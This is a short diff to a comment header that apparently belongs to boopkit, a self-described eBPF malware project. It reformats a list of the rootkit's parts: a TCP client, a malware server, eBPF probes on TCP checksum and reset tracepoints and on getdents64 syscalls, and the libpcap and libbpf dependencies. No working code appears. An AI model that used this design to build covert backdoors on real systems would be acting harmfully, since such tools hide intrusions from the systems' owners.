@@ -6,12 +6,17 @@
 /!
 ### https://github.com/kris-nova/boopkit
 /!
-// TCP Client     :                    [boopkit-boop]
-// Malware Server :                    [boopkit]
-// Malware eBPF Probes:
+# Userspace programs
+// TCP Client                          [boopkit-boop]
+// Malware Server                      [boopkit]
+/!
+# Malware eBPF Probes:
 //   tp/tcp/tcp_bad_csum               [pr0be.boop]
 //   tp/tcp/tcp_receive_reset          [pr0be.boop]
 //   tp/syscalls/sys_enter_getdents64  [pr0be.safe]
 //   tp/syscalls/sys_exit_getdents64   [pr0be.safe]
-//
+/!
+# Malware dependencies:
+//   libpcap.h    Used for packet capture (raw)
+//   libbpf.h     Used for managing eBPF probes
 /!
